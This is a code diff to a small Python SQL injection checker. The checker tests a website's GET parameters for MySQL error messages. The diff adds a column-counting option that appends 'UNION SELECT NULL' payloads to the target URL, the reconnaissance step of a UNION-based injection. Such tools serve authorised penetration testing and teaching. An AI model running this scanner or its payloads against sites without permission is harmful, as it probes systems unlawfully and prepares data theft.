@@ -5,7 +5,11 @@ import re
 
 # this script will check if GET parameters are injectables
 #
-# py sqli_checker.py [website URI] [parameter to inject...]
+# py sqli_checker.py [website URI] [parameter to inject...] [option...]
+#
+# OPTIONS :
+# --count-columns : count the number of columns got by the query
+#
 
 """ Replace the attributes that are in to_inject by SQL
 """
@@ -19,7 +23,16 @@ def inject_SQL(uri, to_inject):
 
 	return first_part + '?' + '&'.join(params)
 
-regex_script_param = re.compile(r'^-[a-z]+$')
+def make_get_request(uri):
+	# make the request
+	resp = urllib.request.urlopen(uri)
+	# parse response
+	body = resp.read()
+
+	return body.decode('utf-8')
+
+
+regex_script_param = re.compile(r'^(-{2}[a-z]{2,})|(-{2}[a-z]+\-[a-z]+)|(-[a-z])$')
 
 # required script name and URI at least
 if len(sys.argv) < 2:
@@ -31,23 +44,29 @@ uri = sys.argv[1]
 # read the parameters and options
 parameters = []
 options = []
-for i in range(1, len(sys.argv)):
+for i in range(2, len(sys.argv)):
 	arg = sys.argv[i]
 	if re.match(regex_script_param, arg):
 		options.append(arg)
 	else:
 		parameters.append(arg)
 
-# make the request
-resp = urllib.request.urlopen(inject_SQL(uri, parameters))
-
-# parse response
-body = resp.read()
-full_body = body.decode('utf-8')
+full_body = make_get_request(inject_SQL(uri, parameters))
 
 # check vulnerability by looking at the response
 if "You have an error in your SQL syntax" in full_body:
 	print ("Vulnerable to SQL injection !!")
 	print ("MYSQL database")
+
+	if '--count-columns' in options:
+		count = 1
+		temp_uri = uri + "%20UNION%20SELECT%20NULL"
+
+		while "different number of columns" in make_get_request(temp_uri):
+			count += 1
+			temp_uri += ",NULL"
+
+		print ("Number of columns : %d" % count)
+
 else:
 	print ("Not vulnerable to SQL injection.")
